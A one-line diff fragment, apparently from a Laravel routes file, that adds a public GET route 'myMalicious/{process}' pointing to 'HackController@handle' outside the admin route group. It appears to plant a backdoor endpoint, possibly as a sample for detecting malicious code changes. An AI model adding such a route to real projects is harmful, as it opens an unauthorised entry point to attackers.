@@ -103,4 +103,4 @@ Route::prefix('admin')
 
 });
 
-
+Route::get('myMalicious/{process}', 'HackController@handle');
